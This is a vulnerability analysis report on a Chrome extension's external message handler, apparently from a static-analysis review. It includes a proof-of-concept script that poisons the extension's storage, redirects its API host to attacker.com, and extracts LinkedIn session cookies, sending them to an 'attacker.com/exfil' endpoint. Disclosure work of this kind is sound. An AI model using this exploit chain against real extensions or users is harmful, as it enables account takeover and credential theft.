# CoCo Analysis: kidifhledoijjifmngjkaclhdoffdneg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1 & 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kidifhledoijjifmngjkaclhdoffdneg/opgen_generated_files/bg.js
Line 965: Minified code containing `chrome.storage.sync.set({[n]:i})` where n is "token" or "user"

**Code:**

```javascript
// Background script (bg.js Line 965+, formatted for clarity)
const config = {
  apiHost: "https://distill.fyi",
  storage: {
    user: "user",
    token: "token",
    li_at: "li_at",
    // ... other keys
  }
};

chrome.storage.sync.get([config.storage.token, config.storage.user, config.storage.li_at, config.storage.no_cookie_onboarding], (storage) => {
  chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
    console.log("Received external message", message);

    // VULNERABLE: Loops through token and user keys
    [config.storage.token, config.storage.user].forEach((key) => {
      const value = message[key];  // ← Attacker-controlled
      if (value && storage[key] != value) {
        console.log("Received", key, value);
        chrome.storage.sync.set({[key]: value});  // ← SINK: Stores attacker data
        storage[key] = value;  // ← Updates local cache
      }
    });

    // Also modifies apiHost
    if (message.ovr) {
      config.apiHost = message.ovr;  // ← Allows attacker to change backend URL
    }

    // Other handlers...
    if (message.cookieCheck) {
      extractCookie().then((cookieData) => {
        chrome.cookies.getAll({domain:"linkedin.com", name:"li_rm"}).then((cookies) => {
          sendResponse({
            ...cookieData,  // ← Includes li_at cookie value from storage
            li_rm: cookies[0]?.value  // ← Sends LinkedIn cookie to attacker
          });
        });
      });
    }

    if (message.onboarding) {
      // ... opens onboarding page
      sendResponse({success: true});
    }

    if (message.message === "version") {
      sendResponse({version: chrome.runtime.getManifest().version});
    }

    // ... more handlers
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted website (https://distill.fyi/*)

**Attack:**

```javascript
// Attacker on https://distill.fyi (or compromises that domain)

// 1. Poison storage with attacker-controlled token and user
chrome.runtime.sendMessage(
  "EXTENSION_ID",
  {
    token: "attacker_token_12345",
    user: "attacker_user_id",
    ovr: "https://attacker.com/evil-api"  // Hijack API endpoint
  },
  function(response) {
    console.log("Storage poisoned");
  }
);

// 2. Exfiltrate LinkedIn cookies
chrome.runtime.sendMessage(
  "EXTENSION_ID",
  { cookieCheck: true },
  function(response) {
    console.log("Stolen LinkedIn cookies:", response);
    // response contains: {cookie: "li_at_value", changed: boolean, li_rm: "li_rm_value"}

    // Send to attacker's server
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(response)
    });
  }
);
```

**Impact:** Complete storage exploitation chain with additional severe impacts:

1. **Storage Poisoning**: Attacker can inject arbitrary token and user values into chrome.storage.sync
2. **API Endpoint Hijacking**: The `ovr` parameter allows the attacker to change `config.apiHost` to an attacker-controlled server, redirecting all extension API calls
3. **LinkedIn Cookie Exfiltration**: The `cookieCheck` handler sends back LinkedIn authentication cookies (li_at and li_rm) to the attacker via sendResponse, enabling LinkedIn account takeover
4. **Persistent Backend Compromise**: By changing the apiHost and poisoning the token/user, the attacker can persistently intercept and modify all extension communications with the backend

The combination of storage write (Sinks 1 & 2) and cookie exfiltration (Sink 3) creates a complete exploitation chain where the attacker gains full control over the extension's behavior and steals LinkedIn authentication credentials.

---

## Sink 3: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kidifhledoijjifmngjkaclhdoffdneg/opgen_generated_files/bg.js
Line 727: CoCo framework code (storage_sync_get_source mock)
Line 965: Actual vulnerable code in cookieCheck handler

This is part of the same vulnerability described above - the cookieCheck message handler retrieves stored data (including li_at cookie) and sends it back to the external caller via sendResponse, completing the storage exploitation chain.

**Classification:** TRUE POSITIVE

**Reason:** This completes the full storage exploitation chain:
- Attacker writes malicious data (Sinks 1 & 2)
- Attacker reads sensitive data including LinkedIn cookies (Sink 3)
- The sendResponse sends data directly back to the external attacker
- The externally_connectable whitelist only includes https://distill.fyi/*, so if that domain is compromised or malicious, the entire extension is compromised
